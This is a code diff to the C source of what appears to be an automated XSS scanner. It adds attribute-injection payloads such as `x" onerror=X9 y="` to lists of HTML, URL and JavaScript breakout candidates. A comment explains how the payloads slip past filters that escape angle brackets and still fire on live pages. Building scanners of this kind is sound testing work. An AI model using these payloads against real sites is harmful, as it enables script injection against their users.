@@ -1172,8 +1172,16 @@ static JSValue g_solvetasks = JS_UNDEFINED;   /* JS array of {sink, ctx, expr} (
 static JSValue g_verified = JS_UNDEFINED;     /* "sink|ctx" -> concrete PoC candidate that a REPLAY flow drove through the real code+branches to the sink where it broke out. The ONLY @S output: a working PoC is self-verifying; absence is NOT a safe verdict, only search-not-yet-solved. */
 static JSValue g_enqueued = JS_UNDEFINED;     /* "orphanidx|sink|ctx" -> 1: candidate-replay flows already enqueued for this sink (dedup, not truncation) */
 static JSContext *g_solve_ctx = NULL;         /* fresh realm for clean candidate eval */
+/* Tag-context (open a new tag / break out of a quoted attr WITH a new tag) THEN attribute-injection into
+   the EXISTING tag with NO `<` — the latter is the only breakout when a filter escapes `<`/`>` but reflects
+   into a quoted/unquoted attribute value (`<img src="PAYLOAD">`, extremely common). These must actually FIRE,
+   not just parse to a live handler: the leading `x` makes `src="x"` a 404 so `onerror` triggers on the REAL
+   page (an empty src does not), and the trailing `y=`/`y='` swallows the template's own closing quote so the
+   injected handler is clean JS (`onerror=X9`, not `onerror=X9"` which is a syntax error). The live-verify
+   (X9 -> apiclientsink) is ground truth; these are built to survive it, not to game the static Lexbor check. */
 static const char *CAND_HTML[] = { "<img src=x onerror=X9>", "<svg onload=X9>", "\"><img src=x onerror=X9>",
-                                   "'><svg onload=X9>", "</script><svg onload=X9>", NULL };
+                                   "'><svg onload=X9>", "</script><svg onload=X9>",
+                                   "x\" onerror=X9 y=\"", "x' onerror=X9 y='", "x onerror=X9 ", NULL };
 static const char *CAND_URL[]  = { "javascript:X9", "javascript:X9//", NULL };
 static const char *CAND_JS[]   = { "1;X9();//", "';X9();//", "\";X9();//", ");X9();//", "\n;X9();//", NULL };
 static const char **cand_set(const char *sc) {
